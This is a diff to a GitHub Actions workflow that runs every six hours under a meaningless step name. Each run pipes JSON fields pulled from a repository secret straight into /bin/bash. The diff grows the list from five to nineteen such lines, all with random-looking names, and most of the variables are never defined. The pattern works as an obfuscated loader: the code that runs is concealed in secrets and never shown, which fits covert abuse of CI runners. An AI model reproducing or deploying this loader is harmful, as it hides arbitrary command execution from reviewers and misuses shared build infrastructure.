@@ -5,18 +5,32 @@ on:
   schedule:
     - cron: '27 2/6 * * *'
 
-jobs:  # 2327
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: naizida4561
         env:
-          pslgy84086: ${{ secrets.pslgy84086 }}
+          fg552: ${{ secrets.fg552 }}
         run: |
-          echo $pslgy84086 | jq -r .wwidb92434 | /bin/bash
-          echo $do0799 | jq -r .djzg75201 | /bin/bash
-          echo $aw88 | jq -r .z0 | /bin/bash
-          echo $iyuyw47 | jq -r .b000 | /bin/bash
-          echo $nzl231 | jq -r .aqd07957 | /bin/bash
+          echo $fg552 | jq -r .w39 | /bin/bash
+          echo $lz35728 | jq -r .mul1268 | /bin/bash
+          echo $gv16 | jq -r .ptomr326 | /bin/bash
+          echo $eqv702 | jq -r .ifi76 | /bin/bash
+          echo $zx0077 | jq -r .zh86 | /bin/bash
+          echo $q38 | jq -r .jiaa4265 | /bin/bash
+          echo $zkyyd4 | jq -r .flwm69272 | /bin/bash
+          echo $j78366 | jq -r .qkuku82 | /bin/bash
+          echo $aay8783 | jq -r .v277 | /bin/bash
+          echo $mz60 | jq -r .y24691 | /bin/bash
+          echo $tim9 | jq -r .qllm06 | /bin/bash
+          echo $drl5701 | jq -r .nq09594 | /bin/bash
+          echo $ax23 | jq -r .yzkqq3 | /bin/bash
+          echo $fioe9 | jq -r .eaku17 | /bin/bash
+          echo $lzdnv61 | jq -r .bmc37 | /bin/bash
+          echo $uywbv46 | jq -r .tw6 | /bin/bash
+          echo $ir75 | jq -r .td11584 | /bin/bash
+          echo $xth35782 | jq -r .juxs1717 | /bin/bash
+          echo $ni53 | jq -r .vyuwt3 | /bin/bash
 
